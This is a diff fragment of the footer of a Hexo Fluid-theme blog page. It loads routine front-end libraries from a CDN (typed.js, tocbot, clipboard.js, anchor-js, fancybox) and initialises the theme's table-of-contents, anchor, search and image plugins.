+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
